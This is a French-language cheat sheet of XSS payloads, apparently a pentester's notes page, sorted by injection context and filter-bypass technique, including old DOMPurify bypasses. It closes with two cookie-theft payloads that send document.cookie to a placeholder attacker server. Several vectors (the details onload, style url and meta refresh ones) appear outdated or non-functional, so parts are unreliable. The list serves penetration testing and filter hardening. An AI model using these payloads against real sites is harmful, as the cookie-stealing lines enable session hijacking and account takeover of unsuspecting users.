# XSS - Payloads

Collection de payloads XSS classes par contexte et type de bypass.

## Payloads de base (JavaScript)

A inserer dans un parametre d'URL et execute via une reflexion HTML. Adapter selon le contexte (balise `<script>`, texte brut, attribut, etc.).

### Alerte simple

```html
<script>alert(1)</script>
```

URL encodee : `%3Cscript%3Ealert(1)%3C%2Fscript%3E`

### Vecteurs `<img>` (fallback si `<script>` est bloque)

```html
<img src=x onerror=alert(1)>
<img src=x onerror="alert('XSS')">
<img src=x onerror=javascript:alert(1)>
```

URL encodee : `%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`

### Balise SVG

```html
<svg/onload=alert(1)>
```

URL encodee : `%3Csvg%2Fonload%3Dalert(1)%3E`

### `<iframe>` (si autorise)

```html
<iframe src="javascript:alert(1)"></iframe>
```

### `<details>` / `<summary>` (exotique)

```html
<details/open/onload=alert(1)>
```

### `<form>` (si contexte formulaire)

```html
<form action="javascript:alert(1)"><input type=submit></form>
```

## Bypass de filtres simples

### `<textarea>` (sortie de contexte)

```html
</textarea><script>alert(1)</script>
```

### `<template>`

```html
<template><script>alert(1)</script></template>
```

### `<style>` avec url javascript

```html
<style>body{background:url("javascript:alert(1)")}</style>
```

### `<meta>` refresh

```html
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

## Bypass DOMPurify (anciennes versions)

```html
<div id="1
![](contenteditable/autofocus/onfocus=confirm('qwq')//index.html)">
```

### Via attribut `title`

```html
<a title="a
<img src=x onerror=alert(1)>">yep</a>
```

### Via attribut `style`

```html
<p x="`<img src=x onerror=alert(1)>"></p>
```

## Vol de cookies

Remplacer `<YOUR_SERVER_IP>` par votre serveur de reception.

```html
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
```

```html
<script>new Image().src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
```

## Voir aussi

- [[XSS - Liens utiles]]
